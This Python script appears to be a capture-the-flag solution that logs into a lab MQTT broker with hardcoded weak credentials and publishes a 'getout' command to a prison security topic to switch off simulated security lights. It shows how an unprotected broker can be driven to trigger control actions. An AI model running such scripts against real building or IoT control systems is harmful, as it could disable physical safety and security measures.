#!/usr/bin/env python3

import paho.mqtt.client as mqtt
import time
import sys

# --- Player Configuration ---
# IMPORTANT: You MUST replace the placeholder values below
#            with the information found in the prison systems!
TARGET_TOPIC = "prison/security/lightsout/"  # EDIT THIS: The specific topic to publish to.
COMMAND_PAYLOAD = "getout"          # EDIT THIS: The specific command phrase.
# ---------------------------

# --- MQTT Configuration (Should match the CTF setup) ---
BROKER_HOST = "198.18.128.11" # IP of the Mosquitto broker
BROKER_PORT = 1883
MQTT_USERNAME = "iotuser"     # Username for MQTT
MQTT_PASSWORD = "iot"         # Password for MQTT

# --- Flag Verification Setup (Not used in this version, but kept for context) ---
# FLAG_CHANNEL_TOPIC = "prison/system/flag_channel"
# SUCCESS_FLAG_PAYLOAD = "{{SECURITY-DISARMED}}"
# WAIT_TIMEOUT = 10 # Seconds to wait for the flag confirmation

# --- Global flag for confirmation (Not used in this version) ---
# confirmation_event = threading.Event() # Not needed

# --- MQTT Callbacks ---
def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print(f"[+] Connected successfully to MQTT broker: {BROKER_HOST}")
        # Immediately try to publish after connecting
        publish_command(client)
    else:
        print(f"[!] MQTT Connection failed with code {rc}. Check broker details and credentials.")
        # Try to signal disconnect or exit if connection fails early
        try:
             client.disconnect()
             client.loop_stop() # Stop loop if connect fails
        except Exception:
             pass # Ignore errors during early exit cleanup
        sys.exit(1) # Exit script if connection fails

def on_publish(client, userdata, mid):
    print(f"[+] Command '{COMMAND_PAYLOAD}' successfully published to '{TARGET_TOPIC}' (MID: {mid}).")
    print("[*] Check the hidden website for status change!")
    # Disconnect after successful publish
    time.sleep(0.5) # Short delay to ensure message is likely sent by broker
    client.disconnect() # This will eventually stop loop_forever

def on_disconnect(client, userdata, rc):
     # This is called both on intentional disconnect and errors
     if rc == 0:
         print("[*] MQTT connection closed gracefully.")
     else:
         print(f"\n[!] Disconnected unexpectedly from MQTT broker (code: {rc}).")
     # loop_forever() will exit upon disconnect


def publish_command(client):
     """Publishes the command payload to the target topic."""
     print(f"[*] Sending command '{COMMAND_PAYLOAD}' to topic '{TARGET_TOPIC}'...")
     try:
         # Use QoS 1 to make it more likely the broker receives it
         result, mid = client.publish(TARGET_TOPIC, payload=COMMAND_PAYLOAD, qos=1)
         if result != mqtt.MQTT_ERR_SUCCESS:
             print(f"[!] Failed to publish command. Error code: {result}")
             client.disconnect() # Disconnect on publish failure
         # Success is handled by on_publish callback
     except Exception as e:
         print(f"[!] Error publishing command: {e}")
         client.disconnect()


# --- Main Execution ---
if __name__ == "__main__":
    print("--- Prison Break: Lights Out Trigger ---")

    # Basic check if placeholders were edited
    if "CHANGE_ME" in TARGET_TOPIC or "CHANGE_ME" in COMMAND_PAYLOAD:
        print("\n[ERROR] Please edit the script first!")
        print("        Replace the placeholder values for TARGET_TOPIC and COMMAND_PAYLOAD")
        print("        with the information found during your recon.")
        sys.exit(1)

    print(f"[*] Target Topic:     {TARGET_TOPIC}")
    print(f"[*] Command Payload:  {COMMAND_PAYLOAD}")

    # Use the correct callback API version
    # If using paho-mqtt v2.0.0 or later, use: mqtt.CallbackAPIVersion.VERSION2
    # If using older versions (like 1.x), use: mqtt.CallbackAPIVersion.VERSION1
    # Add this check or specify the version if you know it:
    try:
        # Attempt to use V2 first (for newer paho-mqtt)
        client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id=f"attacker-lightsout-{time.time()}")
    except AttributeError:
        # Fallback to V1 if V2 is not available (older paho-mqtt)
        print("[INFO] Using older MQTT Callback API Version 1.")
        client = mqtt.Client(client_id=f"attacker-lightsout-{time.time()}")

    client.on_connect = on_connect
    client.on_publish = on_publish
    client.on_disconnect = on_disconnect

    if MQTT_USERNAME and MQTT_PASSWORD:
        client.username_pw_set(MQTT_USERNAME, MQTT_PASSWORD)

    try:
        print(f"[*] Connecting to broker {BROKER_HOST}:{BROKER_PORT}...")
        client.connect(BROKER_HOST, BROKER_PORT, 60)

        # loop_forever() will block until disconnect is called (e.g., in callbacks)
        client.loop_forever()

    except ConnectionRefusedError:
         print(f"\n[!] ERROR: Connection refused. Broker might be down or inaccessible.")
    except KeyboardInterrupt:
         print("\n[*] Script interrupted by user.")
    except Exception as e:
        print(f"\n[!] An unexpected error occurred: {e}")
    finally:
        print("[*] Cleaning up MQTT connection (if loop stopped)...")
        # Ensure loop is stopped WITHOUT the 'force' argument
        # Check if loop_stop is needed (loop_forever usually exits on disconnect)
        try:
            # loop_stop should ideally not be needed after loop_forever exits due to disconnect
            # but call it just in case to be safe, ignore errors if already stopped.
             client.loop_stop() # REMOVED force=True
        except Exception as stop_err:
            pass # Ignore potential errors if loop already stopped.
        print("[*] Script finished.")
